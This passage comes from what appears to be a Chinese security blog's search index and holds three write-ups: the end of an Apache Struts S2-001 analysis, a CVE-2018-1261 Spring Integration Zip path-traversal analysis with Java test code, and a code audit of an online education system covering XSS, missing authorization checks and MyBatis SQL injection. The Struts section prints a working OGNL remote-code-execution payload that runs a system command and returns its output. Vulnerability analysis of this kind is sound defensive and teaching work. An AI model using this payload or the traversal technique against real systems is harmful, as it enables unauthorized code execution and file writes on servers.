title="5.漏洞利用"></a>5.漏洞利用</h2><blockquote><p>username=%{1+1}&amp;password=sqyy</p></blockquote><p><img src="https://ws4.sinaimg.cn/large/0069RVTdgy1fu2ru7sfi2j31g215uq7m.jpg" alt=""></p><p><strong>POC：</strong><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;"ifconfig"&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;&amp;password=sqyy</span><br></pre></td></tr></table></figure></p><p><img src="https://ws4.sinaimg.cn/large/0069RVTdgy1fu2s580ijyj31kw0uuaqu.jpg" alt=""></p><h2 id="6-漏洞修复"><a href="#6-漏洞修复" class="headerlink" title="6.漏洞修复"></a>6.漏洞修复</h2><p>在XWork 2.0.4<code>com/opensymphony/xwork2/util/TextParseUtil.class</code>中,取消了对OGNL的递归解析</p><p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fu3g8lz4xvj31kw0non85.jpg" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-001" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-001</a></li><li><a href="https://xz.aliyun.com/t/2044" target="_blank" rel="noopener">https://xz.aliyun.com/t/2044</a></li><li><a href="http://sh3ll.me/archives/201703152213.txt" target="_blank" rel="noopener">http://sh3ll.me/archives/201703152213.txt</a></li><li><a href="https://03i0.com/2018/04/08/S2-001%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://03i0.com/2018/04/08/S2-001%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/</a></li></ul>]]></content>
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
            <tag> 漏洞分析 </tag>
            
            <tag> 远程代码执行漏洞 </tag>
            
            <tag> Struts-001 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Spring Integration Zip不安全解压（CVE-2018-1261）漏洞分析</title>
      <link href="/Spring-Integration-Zip%E4%B8%8D%E5%AE%89%E5%85%A8%E8%A7%A3%E5%8E%8B%EF%BC%88CVE-2018-1261%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/Spring-Integration-Zip%E4%B8%8D%E5%AE%89%E5%85%A8%E8%A7%A3%E5%8E%8B%EF%BC%88CVE-2018-1261%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><p><script type="text/javascript" src="/js/src/bai.js"></script></p><h2 id="1-漏洞相关信息"><a href="#1-漏洞相关信息" class="headerlink" title="1. 漏洞相关信息"></a>1. 漏洞相关信息</h2><p><strong>漏洞名称</strong>：Spring Integration Zip不安全解压</p><p><strong>漏洞编号</strong>：CVE-2018-1261</p><p><strong>漏洞描述</strong>：在spring-integration-zip.v1.0.1.RELEASE之前的版本中，恶意用户通过在压缩文件中构造包含有特定文件名称的文件（受影响文件格式有bzip2, tar, xz, war, cpio, 7z），应用程序使用spring-integration-zip进行解压时，会导致跨目录任意写入文件漏洞的攻击。进而有可能被Getshell，远程控制。</p><p><strong>漏洞原理</strong>：攻击者可以通过构造一个包含名称带../前缀的文件的压缩包，在spring-integration-zip进行解压时文件跳出解压文件的目录限制，创建文件</p><p><strong>漏洞利用前置条件</strong>：</p><p>1.使用了spring-integration-zip库</p><p>2.接收并解压了来自不可信来源的压缩文件</p><h2 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2. 环境搭建"></a>2. 环境搭建</h2><h3 id="2-1-Libraries："><a href="#2-1-Libraries：" class="headerlink" title="2.1 Libraries："></a>2.1 Libraries：</h3><p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fvcqkzlzjej30xm0mm78v.jpg" alt=""></p><h2 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3. 漏洞复现"></a>3. 漏洞复现</h2><h3 id="3-1-恶意压缩包文件内容"><a href="#3-1-恶意压缩包文件内容" class="headerlink" title="3.1 恶意压缩包文件内容"></a>3.1 恶意压缩包文件内容</h3><p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fvcqke6logj30ww060408.jpg" alt=""><br><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fvcqjturymj31eg04otap.jpg" alt=""></p><h3 id="3-2-测试代码如下"><a href="#3-2-测试代码如下" class="headerlink" title="3.2 测试代码如下"></a>3.2 测试代码如下</h3><p>在<code>unZipTransformer.setWorkDirectory(path);</code>设置了解压文件的路径，CVE-2018-1261目录下会生成good.txt文件，而eval文件就会逃出限制，在根目录生成文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.core.io.DefaultResourceLoader;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.Resource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.ResourceLoader;</span><br><span class="line"><span class="keyword">import</span> org.springframework.integration.support.MessageBuilder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.integration.zip.transformer.UnZipTransformer;</span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.Message;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ResourceLoader resourceLoader = <span class="keyword">new</span> DefaultResourceLoader();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> File path =  <span class="keyword">new</span> File(<span class="string">"./CVE-2018-1261/"</span>);</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String... args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> Resource evilResource = resourceLoader.getResource(<span class="string">"classpath:zip-malicious-traversal.zip"</span>);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            InputStream evilIS = evilResource.getInputStream();</span><br><span class="line">            Message&lt;InputStream&gt; evilMessage = MessageBuilder.withPayload(evilIS).build();</span><br><span class="line">            UnZipTransformer unZipTransformer = <span class="keyword">new</span> UnZipTransformer();</span><br><span class="line">            <span class="comment">//设置解压文件的目录为CVE-2018-1261</span></span><br><span class="line">            unZipTransformer.setWorkDirectory(path);</span><br><span class="line">            unZipTransformer.afterPropertiesSet();</span><br><span class="line">            <span class="comment">//漏洞入口点</span></span><br><span class="line">            unZipTransformer.transform(evilMessage);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            System.out.println(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例中的UnZipTransformer.transform()会调用<code>doZipTransform()</code>来处理压缩包，</p><p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fvcqjhigupj31em0do40o.jpg" alt=""></p><p>在遍历压缩包内目录及文件时，回调ZipEntryCallback中的process()对其进行处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ZipUtil.iterate(inputStream, <span class="keyword">new</span> ZipEntryCallback() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(InputStream zipEntryInputStream, ZipEntry zipEntry)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">final</span> String zipEntryName = zipEntry.getName();</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">if</span> (ZipResultType.FILE.equals(zipResultType)) &#123;</span><br><span class="line">            <span class="keyword">final</span> File tempDir = <span class="keyword">new</span> File(workDirectory, message.getHeaders().getId().toString());</span><br><span class="line">            tempDir.mkdirs(); <span class="comment">//NOSONAR false positive</span></span><br><span class="line">            <span class="keyword">final</span> File destinationFile = <span class="keyword">new</span> File(tempDir, zipEntryName);</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">if</span> (zipEntry.isDirectory()) &#123; ...   &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                SpringZipUtils.copy(zipEntryInputStream, destinationFile);</span><br><span class="line">                uncompressedData.put(zipEntryName, destinationFile);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>../../../那一串是通过<code>zipEntry.getName()</code>得到的</p><p><code>final File destinationFile = new File(tempDir, zipEntryName);</code>确定解压目录</p><p>接着就是调用copy</p><p><img src="https://ws1.sinaimg.cn/large/006tNbRwgy1fvcqiumklej31700aa3zr.jpg" alt=""></p><p>获取传过来的输入数据以及从文件系统中的某个文件中获得输入字节，把数据写到destinationFile处</p><p><img src="https://ws1.sinaimg.cn/large/006tNbRwgy1fvcqh13em8j31kw0woqfq.jpg" alt=""></p><p>要在根目录下创建tmp文件夹</p><p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fvcqgf5wdbj31kw0dp78i.jpg" alt=""></p><h2 id="4-参考链接"><a href="#4-参考链接" class="headerlink" title="4. 参考链接"></a>4. 参考链接</h2><ul><li><a href="https://pivotal.io/security/cve-2018-1261" target="_blank" rel="noopener">https://pivotal.io/security/cve-2018-1261</a></li><li><a href="https://github.com/spring-projects/spring-integration-extensions/" target="_blank" rel="noopener">https://github.com/spring-projects/spring-integration-extensions/</a></li></ul>]]></content>
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>JAVA代码审计 | 因酷网校在线教育系统</title>
      <link href="/JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%9B%A0%E9%85%B7%E7%BD%91%E6%A0%A1%E5%9C%A8%E7%BA%BF%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F/"/>
      <url>/JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%9B%A0%E9%85%B7%E7%BD%91%E6%A0%A1%E5%9C%A8%E7%BA%BF%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F/</url>
      <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><p><script type="text/javascript" src="/js/src/bai.js"></script></p><h1 id="CMS简介："><a href="#CMS简介：" class="headerlink" title="CMS简介："></a>CMS简介：</h1><p>  &ensp;&ensp;&ensp;因酷开源网校系统是由北京因酷时代科技有限公司以下简称（因酷教育软件）研发并推出的国内首家Java版开源网校源代码建站系统，并免费提供给非商业用途用户使用，是用户体验最好、运营功能最全、性价比最高的在线教育软件。</p><blockquote><p>核心框架—Spring Framework<br> 视图框架—Spring MVC<br> 持久层框架—MyBatis 3</p></blockquote><h1 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境:"></a>测试环境:</h1><ul><li>JDK 1.8.8</li><li>Tomcat 7</li><li>Mysql 5.5</li><li>maven 3.5.3</li><li>IntelliJ IDEA 2018.01</li></ul><h1 id="系统安装："><a href="#系统安装：" class="headerlink" title="系统安装："></a>系统安装：</h1><p><a href="http://down.admin5.com/jsp/132874.html" target="_blank" rel="noopener">下载地址：</a><a href="http://down.admin5.com/jsp/132874.html" target="_blank" rel="noopener">http://down.admin5.com/jsp/132874.html</a></p><p>1、首先导入源码，修改相关的配置信息，注意要和数据库的信息相对应</p><p><img src="https://ws1.sinaimg.cn/large/0069RVTdgy1fuo1rrrpruj31kw0re446.jpg" alt=""></p><p>2、在pom.xml中把端口号改成8080，这个可根据自己的实际情况去修改，我这里端口设置的是8080，所以端口号改成8080</p><p><img src="https://ws3.sinaimg.cn/large/0069RVTdgy1fuo1rzzs17j311e0hyad5.jpg" alt=""></p><p>3、配置Tomcat</p><p><img src="https://ws4.sinaimg.cn/large/0069RVTdgy1fuo1sjkam9j31kw0dngog.jpg" alt=""></p><p>4、导入项目时会下载maven下的包，启动时会读取配置文件，所以刚刚导入项目和运行Tomcat时都会有一些慢</p><p><img src="https://ws1.sinaimg.cn/large/0069RVTdgy1fuo1srwjxpj31kw0rg45y.jpg" alt=""></p><h1 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h1><h2 id="1、maven结构："><a href="#1、maven结构：" class="headerlink" title="1、maven结构："></a>1、maven结构：</h2><ul><li><code>src/main/java</code>：是java的代码目录</li><li><code>src/main/resources</code>：是资源目录，放一些配置文件，如properties、spring-mvc.xml等</li><li><code>src/main/webapp</code>：是传统项目的WebContent目录</li></ul><p><img src="https://ws2.sinaimg.cn/large/0069RVTdgy1fuo1t65wa3j30e00p40um.jpg" alt=""></p><h2 id="2、Mybatis："><a href="#2、Mybatis：" class="headerlink" title="2、Mybatis："></a>2、Mybatis：</h2><ul><li><code>Mybatis</code>是作为一款半自动化的持久层框架，因为sql语句都要我们自己手动编写还要注意安全问题，所以Mybatis在一定程度上帮我们避免了这些问题</li><li>但是Mybatis不意味着一定的安全，它总共有两个参数#<code>{id}</code>和<code>${id}</code></li></ul><blockquote><p><code>#{id}</code>：相当于JDBC中的PreparedStatement，预编译处理参数，可以有效的避免注入<br><code>${id}</code>：是未经过预编译，仅仅取输出变量的值</p></blockquote><h2 id="3、Spring-MVC工作流程："><a href="#3、Spring-MVC工作流程：" class="headerlink" title="3、Spring MVC工作流程："></a>3、Spring MVC工作流程：</h2><p>1.用户发送http请求给前端控制器(DispatcherServlet)，前端控制器(DispatcherServlet)接到http请求后查询HandlerMapping，然后选择合适的控制器(Controller)。</p><p>2.控制器(Controller)根据不同的业务逻辑调用不同的服务方法／业务对象来获取模型数据(Model),并返回ModelAndView(模型数据和逻辑视图名)给前端控制器(DispatcherServlet)。</p><p>3.前端控制器(DispatcherServlet)根据返回的逻辑视图名，在ViewResolver的帮助下，选择相应的视图(View)进行渲染。</p><p>4.当View确定后，前端控制器(DispatcherServlet)就把模型数据传给视图(View)，以便渲染视图，响应用户的发出的请求。</p><p><img src="https://ws4.sinaimg.cn/large/0069RVTdgy1fuo1tpzqncj31aw0o6dks.jpg" alt=""></p><h2 id="4、Spring："><a href="#4、Spring：" class="headerlink" title="4、Spring："></a>4、Spring：</h2><p>充当了管理容器的角色，用来管理Spring MVC和Mybatis工作的，充当程序中的桥梁或者说管理者</p><h3 id="Spring的两大核心"><a href="#Spring的两大核心" class="headerlink" title="Spring的两大核心"></a>Spring的两大核心</h3><blockquote><p>控制反转（IoC）/依赖注入（DI）<br>面向切面编程（AOP）</p><ul><li>可以与第三方框架良好整合，降低框架的使用难度，提供对各种优秀框架的支持，如Struts、Hibernate等</li><li>降低Java EE API的使用难度，可以通过Spring建议封装</li><li>依赖注入特性将组件透明化，降低耦合度</li></ul></blockquote><h1 id="源码审计："><a href="#源码审计：" class="headerlink" title="源码审计："></a>源码审计：</h1><p>这里只是抛砖引玉给大家讲一下java代码审计的流程，基于SSM框架的一个思路，如果大家有时间可以深入挖掘一下这套程序，一定会有比较多的收获</p><h2 id="1、XSS"><a href="#1、XSS" class="headerlink" title="1、XSS"></a>1、XSS</h2><p>漏洞发生在搜索课程名称，我们定位到<code>CourseController.java</code>这里</p><p><code>@Autowired注解</code>是自动连接属性传递的时，Spring会将这些传递过来的值或者引用自动分配给那些属性以便我们利用，这里我们可以调用<code>CourseService</code>接口里面的方法<br>跟进接口，可以看到定义接口的一些方法，我们可以找到查询课程相关的接口，其中第61行<code>queryCourseList接口</code>是根据不同条件查询课程列表</p><p><img src="https://ws4.sinaimg.cn/large/0069RVTdgy1fuo1xuxg0nj31h00niq83.jpg" alt=""></p><p>再根据查询相关的接口在定义接口的实现类里查询具体实现的方法，如49行，在<code>CourseMapper</code>中进行数据库查询，直接返回一个list集合</p><p><img src="https://ws1.sinaimg.cn/large/0069RVTdgy1fuo1uosbh5j31g20u2gs2.jpg" alt=""><br><img src="https://ws4.sinaimg.cn/large/0069RVTdgy1fuo1uubmcvj31fg0nmn24.jpg" alt=""></p><p>这里是<code>CourseMapper</code>中对应查询queryCourseList的sql语句</p><p><img src="https://ws1.sinaimg.cn/large/0069RVTdgy1fuo1v1mpwgj31kw06gwha.jpg" alt=""></p><p>然后直接将内容返回到前台的页面上，其实<code>${queryCourse.courseName}</code>是一个EL表达式，代表queryCourse这个实体类下面courseName的值，就是我们查询课程的内容</p><p><img src="https://ws1.sinaimg.cn/large/0069RVTdgy1fuokdlc205j314u0godjq.jpg" alt=""></p><p><img src="https://ws2.sinaimg.cn/large/0069RVTdgy1fuo1yu3uyxj31kw0hrwku.jpg" alt=""></p><h2 id="2、越权漏洞"><a href="#2、越权漏洞" class="headerlink" title="2、越权漏洞"></a>2、越权漏洞</h2><p>漏洞触发点<code>UserController.java</code></p><p><img src="https://ws3.sinaimg.cn/large/0069RVTdgy1fuo1z3u3gqj31kw0mq794.jpg" alt=""></p><p>我们跟进定义的接口，并进入接口的实现类来看看修改用户信息内容中是否有用户权限判断</p><p><img src="https://ws1.sinaimg.cn/large/0069RVTdgy1fuo1zccnlxj30xy05smxq.jpg" alt=""></p><p>第91行，接口实现类中并未做任何用户身份合法性的校验，对请求没进行权限控制</p><p><img src="https://ws2.sinaimg.cn/large/0069RVTdgy1fuo1zjcz8oj30ye0acdhi.jpg" alt=""></p><p>直接引用mapper文件更新信息</p><p><img src="https://ws4.sinaimg.cn/large/0069RVTdgy1fuo1zs0tbcj30ye0acdhi.jpg" alt=""></p><p>这里直接贴图，抓包修改对应的user.userId</p><p><img src="https://ws2.sinaimg.cn/large/0069RVTdgy1fuo201a907j31kw0kswkp.jpg" alt=""><br><img src="https://ws4.sinaimg.cn/large/0069RVTdgy1fuo207sxstj30pe0pa75p.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/0069RVTdgy1fuo20e76ahj31kw0d2n5c.jpg" alt=""><br><img src="https://ws3.sinaimg.cn/large/0069RVTdgy1fuo20jffpij31jq0zctco.jpg" alt=""></p><h2 id="3、SQL注入漏洞"><a href="#3、SQL注入漏洞" class="headerlink" title="3、SQL注入漏洞"></a>3、SQL注入漏洞</h2><p><code>AdminArticleController.java</code>删除文章页面，从前台接收articelId参数</p><p><img src="https://ws1.sinaimg.cn/large/0069RVTdgy1fuo20sd4jmj318k0k0djs.jpg" alt=""></p><p>接口和接口实现类</p><p><img src="https://ws1.sinaimg.cn/large/0069RVTdgy1fuo20xvda4j312s0eemz5.jpg" alt=""><br><img src="https://ws3.sinaimg.cn/large/0069RVTdgy1fuo219ayg7j31au03gt9d.jpg" alt=""></p><p>关键点在这里，我们上面提过Mybatis用${}直接拼接，会产生注入</p><p><img src="https://ws3.sinaimg.cn/large/0069RVTdgy1fuo21fxd47j316w04idgv.jpg" alt=""></p><p><img src="https://ws1.sinaimg.cn/large/0069RVTdgy1fuo21piumuj31kw0byaf6.jpg" alt=""></p><p><img src="https://ws4.sinaimg.cn/large/0069RVTdgy1fuo21vkuvbj30y40bygp7.jpg" alt=""></p><p>类似的注入点和其他漏洞还有很多，只要大家细心就会找到的。这里只是提出三个比较有代表性的漏洞举个例子，让大家对SSM框架的审计有一个思路。</p>]]></content>
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
